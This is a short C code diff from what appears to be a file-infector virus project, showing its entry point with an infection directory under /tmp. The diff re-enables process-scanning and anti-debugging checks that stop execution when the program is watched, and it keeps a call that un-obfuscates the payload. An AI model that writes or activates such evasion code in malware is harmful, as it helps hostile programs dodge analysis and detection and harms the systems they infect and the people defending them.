@@ -7,10 +7,10 @@ int   entry_point(void *magic) {
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
-  /* if (checkProcess(procName) != 0) */
-  /*   return (stop(1, magic)); */
-  /* if (preventDebug(magic) != 0) */
-  /*   return (stop(1, magic)); */
+  if (checkProcess(procName) != 0)
+    return (stop(1, magic));
+  if (preventDebug(magic) != 0)
+    return (stop(1, magic));
   if (magic != (void *)0x42) {
     if (unObfuscate() == -1)
       return (stop(1, magic));
